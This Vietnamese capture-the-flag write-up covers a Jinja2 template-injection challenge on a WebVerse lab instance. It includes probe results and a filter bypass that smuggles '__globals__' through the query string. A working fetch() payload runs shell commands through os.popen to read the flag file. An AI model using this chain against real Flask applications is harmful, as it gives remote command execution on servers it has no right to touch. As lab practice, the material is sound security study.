# Payload đã kiểm chứng - Merged (Certmarq)

Toàn bộ chuỗi dưới đây **đã chạy thật và lấy được cờ** qua `fetch()` trong devtools của
instance `f3f0bac2-5765-merged-fa7dc.mystery-challenges.webverselabs-pro.com`.
Không có `exploit.py` ở đây vì lý do ghi ở cuối file.

## 1. Đăng ký issuer (bấm UI: Start free -> Organisation name / Work email / Password)

Sau khi đăng nhập, session có `uid` và `org`; `/designer` mở ra với một textarea `name="body"`.

## 2. Sink

`POST /designer/preview`, field duy nhất là `body`. Server render bằng `render_template_string`
(đoạn này về sau được chính `entrypoint.sh` của đề xác nhận).

## 3. Fingerprint

| Probe | Kết quả |
| --- | --- |
| `{{7*7}}` | `49` |
| `{{7*'7'}}` | `7777777` -> Jinja2 (Twig sẽ ra `77`) |
| `${7*7}` | không đổi -> không phải Twig/EJS |
| `{{config.items()}}` | in hết Flask config, **lộ `SECRET_KEY`** |
| `{{session}}` | `{'email': ..., 'org': '{{7*7}}', 'uid': 2}` |
| `{{ ''.__class__ }}` | `Template rejected by our safety filter — the pattern "__" is not allowed` |

Kết luận: Jinja2/Flask, bộ lọc **chỉ cấm đúng chuỗi `__`**, mọi thứ khác (kể cả `|attr`, `['os']`,
`popen`, `request.args`) đều đi qua.

## 4. Vượt lọc bằng cách smuggle tên dunder qua query string

Template body không chứa `__`; tên `__globals__` đến từ `request.args` (query string không bị filter
chạm tới):

```jinja
{{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}
```

## 5. Gọi thật (devtools console, chạy trên chính tab instance)

```js
const body = "{{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}";
const q = "?g=" + "__globals__" + "&c=" + encodeURIComponent("cat /flag.txt");
const r = await fetch("/designer/preview" + q, {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({ body }),
  credentials: "include",
});
const t = await r.text();
console.log(t.match(/WEBVERSE\{[^}]*\}/)[0]);
```

Kết quả trả về trong khối preview:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)   (với c=id)
WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}              (với c=cat /flag.txt)
```

Bằng chứng thêm từ `/entrypoint.sh` (đọc qua chính RCE này):

```
Direct, unsandboxed Jinja2 SSTI: the designer preview (POST /designer/preview)
renders the issuer's certificate body with render_template_string, so a
standard Jinja2 RCE chain reads /flag.txt.
```

## Vì sao không có `exploit.py` tái chạy được

Script `requests` đã viết nhưng **chưa từng chạy thành công**: khi thử lại thì instance Merged đã bị
stop (WebVerse chỉ cho chạy một instance lúc, và bạn chuyển sang Justified nên `/register` trả 404).
Tên field thật của form đăng ký cũng chưa kịp lấy (form render bằng label, chưa xác nhận `name=`).
Vì vậy để lại đúng snippet JS đã verify ở trên thay vì một script chưa kiểm chứng.

Để chạy lại: mở instance Merged mới, đăng ký qua UI, rồi dán đoạn JS ở mục 5 vào console của tab đó.
